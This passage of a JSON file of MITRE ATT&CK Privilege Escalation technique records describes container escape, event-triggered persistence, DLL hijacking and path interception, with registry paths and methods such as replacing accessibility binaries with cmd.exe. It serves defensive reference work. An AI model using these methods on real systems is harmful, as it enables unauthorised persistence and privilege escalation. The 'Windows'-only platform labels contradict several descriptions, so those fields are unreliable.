    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Domain or Tenant Policy Modification",
    "parent_technique_id": "T1484",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:04.973899"
  },
  {
    "technique_id": "T1611",
    "name": "Escape to Host",
    "description": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.[1]There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the hostâ€™s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such asunshareandkeyctlto escalate privileges and steal secrets.[2][3][4][5][6][7]Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such asdocker.sock, to break out of the container via aContainer Administration Command.[5]Adversaries may also escape viaExploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.[8]In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.[9]Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:08.328127",
    "subtechniques": []
  },
  {
    "technique_id": "T1546",
    "name": "Event Triggered Execution",
    "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:11.586298",
    "subtechniques": [
      {
        "id": "T1546.001",
        "name": "Change Default File Association"
      },
      {
        "id": "T1546.002",
        "name": "Screensaver"
      },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      {
        "id": "T1546.007",
        "name": "Netsh Helper DLL"
      },
      {
        "id": "T1546.008",
        "name": "Accessibility Features"
      },
      {
        "id": "T1546.009",
        "name": "AppCert DLLs"
      },
      {
        "id": "T1546.010",
        "name": "AppInit DLLs"
      },
      {
        "id": "T1546.011",
        "name": "Application Shimming"
      },
      {
        "id": "T1546.012",
        "name": "Image File Execution Options Injection"
      },
      {
        "id": "T1546.013",
        "name": "PowerShell Profile"
      },
      {
        "id": "T1546.015",
        "name": "Component Object Model Hijacking"
      },
      {
        "id": "T1546.016",
        "name": "Installer Packages"
      }
    ]
  },
  {
    "technique_id": "T1546.001",
    "name": "Change Default File Association",
    "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.[1][2][3]Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed underHKEY_CLASSES_ROOT.[extension], for exampleHKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located atHKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key atHKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\print\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.[4]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:14.927705"
  },
  {
    "technique_id": "T1546.002",
    "name": "Screensaver",
    "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.[1]The Windows screensaver application scrnsave.scr is located inC:\\Windows\\System32\\, andC:\\Windows\\sysWOW64\\on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:SCRNSAVE.exe- set to malicious PE pathScreenSaveActive- set to '1' to enable the screensaverScreenSaverIsSecure- set to '0' to not require a password to unlockScreenSaveTimeout- sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.[2]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:18.268050"
  },
  {
    "technique_id": "T1546.003",
    "name": "Windows Management Instrumentation Event Subscription",
    "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.[1]Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.[2][3]Adversaries may also compile WMI scripts â€“ usingmofcomp.exeâ€“into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.[4][5]WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:21.638727"
  },
  {
    "technique_id": "T1546.007",
    "name": "Netsh Helper DLL",
    "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[1]The paths to registered netsh.exe helper DLLs are entered into the Windows Registry atHKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.[2][3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:24.908171"
  },
  {
    "technique_id": "T1546.008",
    "name": "Accessibility Features",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs areC:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times andC:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.[1]Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in%systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP).[2]TheImage File Execution Options Injectiondebugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected overRemote Desktop Protocolwill cause the replaced file to be executed with SYSTEM privileges.[3]Other accessibility features exist that may also be leveraged in a similar fashion:[2][4]On-Screen Keyboard:C:\\Windows\\System32\\osk.exeMagnifier:C:\\Windows\\System32\\Magnify.exeNarrator:C:\\Windows\\System32\\Narrator.exeDisplay Switcher:C:\\Windows\\System32\\DisplaySwitch.exeApp Switcher:C:\\Windows\\System32\\AtBroker.exe",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:28.266326"
  },
  {
    "technique_id": "T1546.009",
    "name": "AppCert DLLs",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppCertDLLsRegistry key underHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\are loaded into every process that calls the ubiquitously used application programming interface (API) functionsCreateProcess,CreateProcessAsUser,CreateProcessWithLoginW,CreateProcessWithTokenW, orWinExec.[1]Similar toProcess Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:31.629620"
  },
  {
    "technique_id": "T1546.010",
    "name": "AppInit DLLs",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppInit_DLLsvalue in the Registry keysHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WindowsorHKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windowsare loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.[1]Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.[2]Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:34.875580"
  },
  {
    "technique_id": "T1546.011",
    "name": "Application Shimming",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.[1]Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\\AppPatch\\sysmain.sdbandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Customandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used toBypass User Account Control(UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.[2]Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:38.259313"
  },
  {
    "technique_id": "T1546.012",
    "name": "Image File Execution Options Injection",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an applicationâ€™s IFEO will be prepended to the applicationâ€™s name, effectively launching the new process under the debugger (e.g.,C:\\dbg\\ntsd.exe -g  notepad.exe).[1]IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.[2]IFEOs are represented asDebuggervalues in the Registry underHKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\where<executable>is the binary on which the debugger is attached.[1]IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).[3][4]Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values inHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.[3][4]Similar toAccessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected withRemote Desktop Protocolwill cause the \"debugger\" program to be executed with SYSTEM privileges.[5]Similar toProcess Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.[6]Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO toImpair Defensesby registering invalid debuggers that redirect and effectively disable various system and security applications.[7][8]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:41.517225"
  },
  {
    "technique_id": "T1546.013",
    "name": "PowerShell Profile",
    "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs whenPowerShellstarts and can be used as a logon script to customize user environments.PowerShellsupports several profiles depending on the user or host program. For example, there can be different profiles forPowerShellhost programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.[1]Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/orPowerShelldrives to gain persistence. Every time a user opens aPowerShellsession the modified script will be executed unless the-NoProfileflag is used when it is launched.[2]An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:44.870960"
  },
  {
    "technique_id": "T1546.015",
    "name": "Component Object Model Hijacking",
    "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1]References to various COM objects are stored in the Registry.Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[2]An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:48.230558"
  },
  {
    "technique_id": "T1546.016",
    "name": "Installer Packages",
    "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.[1]Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOSpostinstallscripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as aLaunch Daemon) with the elevated permissions.[2][3][4][5]Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can includepreinst,postinst,prerm,postrmscripts and run as root when executed.For Windows, the Microsoft Installer services uses.msifiles to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.[6]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:51.485278"
  },
  {
    "technique_id": "T1068",
    "name": "Exploitation for Privilege Escalation",
    "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).[1][2]Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system viaIngress Tool TransferorLateral Tool Transfer.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:54.859542",
    "subtechniques": []
  },
  {
    "technique_id": "T1574",
    "name": "Hijack Execution Flow",
    "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:03:58.222377",
    "subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      },
      {
        "id": "T1574.014",
        "name": "AppDomainManager"
      }
    ]
  },
  {
    "technique_id": "T1574.001",
    "name": "DLL",
    "description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.[1]Specific ways DLLs are abused by adversaries include:DLL SideloadingAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.Adversaries may also side-load other packages, such as BPLs (Borland Package Library).[2]DLL Search Order HijackingAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.[1]DLL RedirectionAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.[3][4]Phantom DLL HijackingAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.[5][6]DLL SubstitutionAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.[7]Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.[8][9]If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:01.578554"
  },
  {
    "technique_id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the%TEMP%directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage ofDLLsearch order hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related toBypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.[1][2]If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:04.921817"
  },
  {
    "technique_id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" inC:\\example path, which by default precedesC:\\Windows\\system32\\net.exein the PATH environment variable, when \"net\" is executed from the command-line theC:\\example pathwill be called instead of the system's legitimate executable atC:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from aCommand and Scripting Interpreter.[1]Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the$PATHvariable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl,Unix Shell Configuration Modification, or modifying the/etc/paths.dfolder contents.[2][3][4]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:08.190419"
  },
  {
    "technique_id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. UnlikeDLLsearch order hijacking, the search order differs depending on the method that is used to execute the program.[1][2][3]However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argumentnet user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", thencmd.exe /C net userwill execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.[4]Search order hijacking is also a common practice for hijacking DLL loads and is covered inDLL.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:11.544089"
  },
  {
    "technique_id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
